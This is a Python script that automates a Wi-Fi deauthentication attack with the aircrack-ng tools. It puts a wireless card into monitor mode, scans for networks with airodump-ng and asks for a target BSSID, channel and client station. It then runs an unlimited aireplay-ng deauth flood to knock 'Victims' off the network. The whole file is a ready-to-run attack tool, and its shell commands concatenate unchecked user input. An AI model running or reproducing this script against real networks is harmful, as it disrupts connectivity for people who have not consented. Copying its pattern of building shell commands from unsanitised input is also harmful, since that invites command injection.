import os
import netifaces


def monitorMode(a):
	os.system("ifconfig " + a + " down")
	os.system("iwconfig " + a + " mode monitor")
	os.system("ifconfig " + a + " up")

if __name__ == '__main__':
    print("Let's start playing :)")
    print("Please insert the network card you want to remov monitorMode")
    os.system("ifconfig")
    iflist = netifaces.interfaces()
    print(iflist)
    print("Please choose which network card you want to use 1,2,3 ......")
    index = int(input())
    network_MY = iflist[index]
    monitorMode(network_MY)
    print("network card :"+network_MY)
    os.system("airmon-ng start "+network_MY)
    print("Now we will check the networks and when he finds the network you want to attack you will press CTRL + C \n"
          "If you are ready, press Enter")
    input()
    os.system("airodump-ng "+network_MY)
    print("cope BSSID target")
    BSSID_atak = input()
    print("cope ch target")
    BSSID_ch    = input()
    print("Now we are monitoring SPECIFICALLY our target ")
    print("Press CTRL + C whenever you see who you want to attack on the Azo network")
    print( "If you are ready, press Enter")
    input()
    os.system("airodump-ng -d "+BSSID_atak+" -c "+BSSID_ch+" "+network_MY)
    print("Now copy the STATION you want and we will start dropping the network and when you want to finish press CTRL + C")
    STATION = input()
    os.system("aireplay-ng -0 0 -a "+BSSID_atak+" -c "+STATION+" "+network_MY)
    print("good!!!!!! ")

    print("Look for the Victims you want")